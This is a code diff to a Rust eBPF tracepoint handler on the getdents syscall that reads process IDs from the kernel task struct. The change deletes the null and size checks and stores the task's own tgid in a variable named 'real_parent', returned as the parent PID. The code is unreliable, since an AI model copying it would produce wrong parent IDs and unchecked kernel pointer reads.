@@ -40,28 +40,12 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         let ppid = unsafe {
             let task = bpf_get_current_task() as *const task_struct;
 
-            if task.is_null() {
-                return Err(0);
-            }
+            let real_parent = (*task).tgid;
 
-            if core::mem::size_of::<task_struct>() > core::mem::size_of_val(&*task) {
-                return Err(0);
-            }
-
-            let real_parent = (*task).real_parent;
-
-            if real_parent.is_null() {
-                return Err(0);
-            }
-
-            if core::mem::size_of::<task_struct>() > core::mem::size_of_val(&*real_parent) {
-                return Err(0);
-            }
-
-            let ppid = (*real_parent).tgid;
-            info!(&ctx, "task is {:x}", task as u64);
-            info!(&ctx, "real_parent address: {:x}", real_parent as u64);
-            ppid
+            // let ppid = (*real_parent).tgid;
+            // info!(&ctx, "task is {:x}", task as u64);
+            // info!(&ctx, "real_parent address: {:x}", real_parent as u64);
+            real_parent
         };
     }
     // let real_parent_ptr = task.add(1448) as *const *const cty::c_void; // 指向 real_parent 的指针的指针
